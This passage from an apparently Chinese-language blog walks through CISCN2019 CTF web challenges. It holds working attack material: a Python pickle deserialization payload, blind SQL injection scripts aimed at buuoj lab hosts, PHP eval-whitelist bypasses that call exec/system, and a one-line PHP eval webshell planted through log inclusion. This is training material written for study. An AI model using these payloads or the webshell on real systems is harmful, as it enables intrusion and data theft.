<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">相比于 PHP 反序列化必须要依赖于当前代码中类的存在以及方法的存在，Python 凭借着自己彻底的面向对象的特性完胜 PHP ，Python 除了能反</span><br><span class="line">序列化当前代码中出现的类(包括通过 import的方式引入的模块中的类)的对象以外，还能利用其彻底的面向对象的特性来反序列化使用 types 创</span><br><span class="line">建的匿名对象，这样的话就大大拓宽了我们的攻击面</span><br><span class="line">当序列化以及反序列化的过程中中碰到一无所知的扩展类型( python2,这里指的就是新式类)的时候，可以通过类中定义的 __reduce__ 方法来告</span><br><span class="line">知如何进行序列化或者反序列化也就是说我们，只要在新式类中定义一个__reduce__ 方法，我们就能在序列化的使用让这个类根据我们在 </span><br><span class="line">__reduce__ 中指定的方式进行序列化</span><br></pre></td></tr></table></figure>
<p>可以用nc在vps上开个端口监听，让其去访问<br>也可以利用返回参数把它带出来<br>可以看到上面的代码p是可以返回的，这里我们让p等于flag的内容，就能获得flag了<br>payload：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import pickle</span><br><span class="line">import urllib</span><br><span class="line"></span><br><span class="line">class payload(object):</span><br><span class="line">    def __reduce__(self):</span><br><span class="line">       <span class="built_in">return</span> (<span class="built_in">eval</span>, (<span class="string">"open('/flag.txt','r').read()"</span>,))</span><br><span class="line"></span><br><span class="line">a = pickle.dumps(payload())</span><br><span class="line">a = urllib.quote(a)</span><br><span class="line"><span class="built_in">print</span> a</span><br></pre></td></tr></table></figure></p>
<p><img src="https://uploader.shimo.im/f/F7l8p7JO4g8AkFde.png!thumbnail" alt></p>
<h2 id="Hack-World"><a href="#Hack-World" class="headerlink" title="Hack World"></a>Hack World</h2><p>过滤了注释符，试了一下异或注入，可以过滤了limit和group，注不出来表名的（触非只有一个表）<br>其实这道题直接就给了表名和列名<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">All You Want Is In Table <span class="string">'flag'</span> and the column is <span class="string">'flag'</span></span><br><span class="line">Now, just give the id of passage</span><br></pre></td></tr></table></figure></p>
<p>flag表和flag列，布尔盲注<br>脚本<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">list = <span class="string">"QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm_0123456789.,&#123;&#125;-"</span></span><br><span class="line">i=1</span><br><span class="line">flag=<span class="string">""</span></span><br><span class="line">url=<span class="string">"http://16a38db3-8993-4ff1-a050-81b660d9dbb3.node3.buuoj.cn/index.php"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(2,20):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> list:</span><br><span class="line">        id=<span class="string">"1^if(ascii(substr((select(flag)from(flag)),&#123;&#125;,1))=&#123;&#125;,1,0)^1"</span>.format(i,ord(j))</span><br><span class="line">        data=&#123;<span class="string">"id"</span>:id&#125;</span><br><span class="line">        p=requests.post(url,data=data)</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">"Hello, glzjin wants a girlfriend."</span> <span class="keyword">in</span> p.text):</span><br><span class="line">                    flag=flag+j</span><br><span class="line">                    <span class="built_in">print</span>(flag)</span><br><span class="line">                    <span class="built_in">break</span></span><br></pre></td></tr></table></figure></p>
<p>其实不用异或，直接盲注也可<br>也可不用括号，tab符代替空格</p>
<h2 id="Love-Math"><a href="#Love-Math" class="headerlink" title="Love Math"></a>Love Math</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!isset(<span class="variable">$_GET</span>[<span class="string">'c'</span>]))&#123; </span><br><span class="line">    show_source(__FILE__); </span><br><span class="line">&#125;<span class="keyword">else</span>&#123; </span><br><span class="line">    //例子 c=20-1 </span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">'c'</span>]; </span><br><span class="line">    <span class="keyword">if</span> (strlen(<span class="variable">$content</span>) &gt;= 80) &#123; </span><br><span class="line">        die(<span class="string">"太长了不会算"</span>); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">' '</span>, <span class="string">'\t'</span>, <span class="string">'\r'</span>, <span class="string">'\n'</span>,<span class="string">'\'</span><span class="string">', '</span><span class="string">"', '`', '\[', '\]']; </span></span><br><span class="line"><span class="string">    foreach (<span class="variable">$blacklist</span> as <span class="variable">$blackitem</span>) &#123; </span></span><br><span class="line"><span class="string">        if (preg_match('/' . <span class="variable">$blackitem</span> . '/m', <span class="variable">$content</span>)) &#123; </span></span><br><span class="line"><span class="string">            die("</span>请不要输入奇奇怪怪的字符<span class="string">"); </span></span><br><span class="line"><span class="string">        &#125; </span></span><br><span class="line"><span class="string">    &#125; </span></span><br><span class="line"><span class="string">    //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp </span></span><br><span class="line"><span class="string">    <span class="variable">$whitelist</span> = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh'];</span></span><br><span class="line"><span class="string">    preg_match_all('/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/', <span class="variable">$content</span>, <span class="variable">$used_funcs</span>);   </span></span><br><span class="line"><span class="string">    foreach (<span class="variable">$used_funcs</span>[0] as <span class="variable">$func</span>) &#123; </span></span><br><span class="line"><span class="string">        if (!in_array(<span class="variable">$func</span>, <span class="variable">$whitelist</span>)) &#123; </span></span><br><span class="line"><span class="string">            die("</span>请不要输入奇奇怪怪的函数<span class="string">"); </span></span><br><span class="line"><span class="string">        &#125; </span></span><br><span class="line"><span class="string">    &#125; </span></span><br><span class="line"><span class="string">    //帮你算出答案 </span></span><br><span class="line"><span class="string">    eval('echo '.<span class="variable">$content</span>.';'); </span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>
<p>没啥思路啊，附<a href="https://www.cnblogs.com/sijidou/p/10802475.html" target="_blank" rel="noopener">wp</a><br>记录一下payload<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$pi</span>=hypot.min.fmod;<span class="variable">$pi</span>=<span class="variable">$pi</span>&#123;2&#125;.<span class="variable">$pi</span>&#123;0&#125;.<span class="variable">$pi</span>&#123;2&#125;.<span class="variable">$pi</span>&#123;6&#125;.<span class="variable">$pi</span>&#123;7&#125;.<span class="variable">$pi</span>&#123;8&#125;.<span class="variable">$pi</span>&#123;3&#125;;<span class="variable">$pi</span>()</span><br><span class="line">//phpinfo()</span><br></pre></td></tr></table></figure></p>
<p>base_convert()函数转换进制的一个函数，可以转到2-36进制之间，36进制包含所有的小写字母<br>可以用十进制转36进制来生成payload<br>下划线不在36进制中，file_get_contents不能用，大写也用不了，$_GET，$_POST不能用<br>getallheader()来控制请求头，通过请求头的字段读取flag.php<br>getallheader()返回的是数组，要从数组里面取数据用array[‘xxx’]，但是[]被waf了，可以用{}<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$pi</span>=base_convert,<span class="variable">$pi</span>(696468,10,36)((<span class="variable">$pi</span>(8768397090111664438,10,30))()&#123;1&#125;)</span><br><span class="line">//<span class="built_in">exec</span>(<span class="function"><span class="title">getallheaders</span></span>()&#123;1&#125;)</span><br><span class="line"><span class="built_in">echo</span> xx,yy 这样xx和yy都会输出，所以base_convert后是逗号</span><br><span class="line">在请求头加上 1:cat /flag即可</span><br></pre></td></tr></table></figure></p>
<p>还有一种方法<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">exp=cat /flag&amp;abs=system&amp;c=<span class="variable">$pi</span>=base_convert(37907361743,10,36)(dechex(1598506324));($<span class="variable">$pi</span>)&#123;abs&#125;($<span class="variable">$pi</span>&#123;exp&#125;)</span><br><span class="line">base_convert(37907361743,10,36)</span><br><span class="line">//得到hex2bin()，把16进制数转为ascii字符</span><br><span class="line">dechex()把十进制转为16进制</span><br><span class="line">整体得到_GET</span><br></pre></td></tr></table></figure></p>
<p>其实主要思路都是利用base_convert把十进制转为字符串，调用函数，另外base_convert接收的十进制数不能太大，否则会溢出</p>
<h2 id="Easyweb"><a href="#Easyweb" class="headerlink" title="Easyweb"></a>Easyweb</h2><p>/robots.txt发现备份文件<br>image.php<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">include <span class="string">"config.php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span>=isset(<span class="variable">$_GET</span>[<span class="string">"id"</span>])?<span class="variable">$_GET</span>[<span class="string">"id"</span>]:<span class="string">"1"</span>;</span><br><span class="line"><span class="variable">$path</span>=isset(<span class="variable">$_GET</span>[<span class="string">"path"</span>])?<span class="variable">$_GET</span>[<span class="string">"path"</span>]:<span class="string">""</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span>=addslashes(<span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$path</span>=addslashes(<span class="variable">$path</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span>=str_replace(array(<span class="string">"\\0"</span>,<span class="string">"%00"</span>,<span class="string">"\\'"</span>,<span class="string">"'"</span>),<span class="string">""</span>,<span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$path</span>=str_replace(array(<span class="string">"\\0"</span>,<span class="string">"%00"</span>,<span class="string">"\\'"</span>,<span class="string">"'"</span>),<span class="string">""</span>,<span class="variable">$path</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$result</span>=mysqli_query(<span class="variable">$con</span>,<span class="string">"select * from images where id='&#123;<span class="variable">$id</span>&#125;' or path='&#123;<span class="variable">$path</span>&#125;'"</span>);</span><br><span class="line"><span class="variable">$row</span>=mysqli_fetch_array(<span class="variable">$result</span>,MYSQLI_ASSOC);</span><br><span class="line"></span><br><span class="line"><span class="variable">$path</span>=<span class="string">"./"</span> . <span class="variable">$row</span>[<span class="string">"path"</span>];</span><br><span class="line">header(<span class="string">"Content-Type: image/jpeg"</span>);</span><br><span class="line">readfile(<span class="variable">$path</span>);</span><br></pre></td></tr></table></figure></p>
<p>addslashes函数对预定义字符加反斜杠<br>预定义字符是：单引号（’）双引号（”）反斜杠（\）NULL<br>过滤了单引号，所以只能用参数污染的方式逃逸出来第二个参数的单引号，再注释掉后一个单引号<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from images <span class="built_in">where</span> id=<span class="string">'\'</span> or path=<span class="string">'#'</span></span><br></pre></td></tr></table></figure></p>
<p>如果直接id=\,会被转义变成\,巧妙的地方在str_replace的过滤顺序上<br>\0比\先给替换为空，id=\0，被转义后变成\0,\0先被过滤，\逃逸出来<br>脚本<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">i=1</span><br><span class="line">n=2</span><br><span class="line">flag=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(22,30):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    m=64</span><br><span class="line">    j=64</span><br><span class="line">    <span class="keyword">for</span> q <span class="keyword">in</span> range(1,9):</span><br><span class="line">        <span class="keyword">if</span> q!=1 and q!=8:</span><br><span class="line">            j=j/2</span><br><span class="line">            <span class="keyword">if</span> n==1:</span><br><span class="line">                m=m+j</span><br><span class="line">            <span class="keyword">elif</span> n==0:</span><br><span class="line">                m=m-j</span><br><span class="line">        <span class="comment">#time.sleep(0.15)</span></span><br><span class="line">        url1=<span class="string">"http://abdb5c41-1004-4076-9dbe-c8ca367960e0.node3.buuoj.cn/image.php?id=\\0&amp;path="</span></span><br><span class="line">        <span class="keyword">if</span> q!=8:</span><br><span class="line">            <span class="comment">#url1="http://eb6f3e10-4e15-48be-a6e9-a64ac0ed813b.node3.buuoj.cn/image.php?id=\\0&amp;path="</span></span><br><span class="line">            <span class="comment">#payload="or ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),&#123;&#125;,1))=&#123;&#125;%23".format(i,ord(j))</span></span><br><span class="line">            payload=<span class="string">""</span><span class="string">"or ascii(substr((select group_concat(`2`) from (select 1,2 union select * from users)a),&#123;&#125;,1))&gt;&#123;&#125;%23"</span><span class="string">""</span>.format(i,m)</span><br><span class="line">            url=url1+payload</span><br><span class="line">            p=requests.get(url)</span><br><span class="line">            <span class="keyword">if</span> (len(p.text)!=0):</span><br><span class="line">                n=1</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                n=0</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            payload=<span class="string">""</span><span class="string">"or ascii(substr((select group_concat(`2`) from (select 1,2 union select * from users)a),&#123;&#125;,1))=&#123;&#125;%23"</span><span class="string">""</span>.format(i,m)</span><br><span class="line">            url=url1+payload</span><br><span class="line">            p=requests.get(url)</span><br><span class="line">            m=int(m)</span><br><span class="line">            <span class="keyword">if</span> (len(p.text)!=0):</span><br><span class="line">                flag=flag+chr(m)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                flag=flag+chr(m+1)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure></p>
<p>因为过滤了单引号，双引号加了反斜杠，所以无法注出列名，这里用无列名注入，select 1,2 改变列数测出有两列<br>自己写了个二分法，每一位都要判断8次，之前记得有个判断7次就可以的，忘了怎么写的233<br>还有buu的429，大概延迟0.15就可，用跑出来的账号密码登陆<br>admin e2d32fe680e523c28c67<br>文件上传，先随便上传一个jpg文件试试，上传之后给了一个日志文件，包含了文件名，这里想到用包含文件名利用日志getshell<br>过滤了php这个词，所以用短标签<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?=<span class="built_in">eval</span>(<span class="variable">$_POST</span>[<span class="string">'cop'</span>]);?&gt;</span><br></pre></td></tr></table></figure></p>
<p>phpinfo可以，奇怪的是直接执行命令不行，看了下也没禁用system啊233，菜刀连一下flag在根目录<br>后来想到可能是因为没输出加个@应该就行了</p>
</div><div class="post-copyright"><blockquote><p>Ursprünglicher Autor: cop</p><p>Ursprünglicher Link: <a href="http://yoursite.com/2020/01/22/CISCN2019/">http://yoursite.com/2020/01/22/CISCN2019/</a></p><p>Copyright-Erklärung: Bitte geben Sie die Quelle des Nachdrucks an.</p></blockquote></div><div class="tags"></div><div class="post-share"><div class="social-share"><span>Aktie:</span></div></div><div class="post-nav"><a href="/2020/02/03/2020HGAME/" class="pre">2020HGAME</a><a href="/2020/01/21/php无参数命令执行/" class="next">php无参数命令执行</a></div><div id="comments"></div></div></div></div><div class="layout-r"><div id="sidebar"><div class="search-pla"></div><div id="toc" class="widget"><div class="widget-title"><i class="fa fa-fei">Inhalte</i></div><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Dropbox"><span class="toc-text">Dropbox</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ikun"><span class="toc-text">ikun</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Hack-World"><span class="toc-text">Hack World</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Love-Math"><span class="toc-text">Love Math</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Easyweb"><span class="toc-text">Easyweb</span></a></li></ol></div><div class="widget"><div class="widget-title"><i class="fa fa-xie"> Letzte</i></div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2020/07/29/233/">233</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/07/20/vulhub复现记录-2/">vulhub复现记录-2</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/07/17/java学习笔记/">java学习笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/07/13/vulhub复现记录/">vulhub复现记录</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/07/03/7月6日周记录/">7月6日周记录</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/07/03/刷cve/">buu按顺序刷题知识点小结</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/05/24/GKCTF/">GkCTF</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/05/20/2020网鼎后三场wp/">2020网鼎后三场wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/05/11/2020网鼎杯wp/">2020网鼎杯wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/05/09/。。。/">。。。</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-biao"> Tags</i></div><div class="tagcloud"></div></div><div class="widget"><div class="widget-title"><i class="fa fa-archive"> Archiv</i></div><ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/">2020</a><span class="archive-list-count">35</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/">2019</a><span class="archive-list-count">8</span></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-you"> Blogroll</i></div><ul></ul><a href="http://www.example1.com/" title="site-name1" target="_blank">site-name1</a><ul></ul><a href="http://www.example2.com/" title="site-name2" target="_blank">site-name2</a><ul></ul><a href="http://www.example3.com/" title="site-name3" target="_blank">site-name3</a></div></div></div></div><a id="totop" href="#top"></a><div id="footer"><div class="footer-info"><p><a href="/baidusitemap.xml">Sitemap</a> |  <a href="/atom.xml">Abonnieren Sie diese Site</a> |  <a href="/about/">Kontaktieren Sie den Blogger</a></p><p>本站总访问量：<i id="busuanzi_container_site_pv"><i id="busuanzi_value_site_pv"></i></i>次，本站总访客数:<i id="busuanzi_container_site_uv"><i id="busuanzi_value_site_uv"></i></i>人</p><p><span> Copyright &copy;<a href="/." rel="nofollow">cop.</a></span><span> Theme by<a rel="nofollow" target="_blank" href="https://github.com/chaooo/hexo-theme-BlueLake"> BlueLake.</a></span><span> Count by<a href="http://busuanzi.ibruce.info/"> busuanzi.</a></span><span> Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a></span></p></div></div></div><script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script><script type="text/javascript" src="/js/search.json.js?v=2.0.5"></script><div id="fullscreen-img" class="hide"><span class="close"></span></div><script type="text/javascript" src="/js/imgview.js?v=2.0.5" async></script><script type="text/javascript" src="/js/toctotop.js?v=2.0.5" async></script><link rel="stylesheet" type="text/css" href="/share/css/share.css"><script type="text/javascript" src="/share/js/social-share.js" charset="utf-8"></script><script type="text/javascript" src="/share/js/qrcode.js" charset="utf-8"></script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/miku.model.json"},"display":{"position":"right","width":300,"height":600},"mobile":{"show":true}});</script></body></html>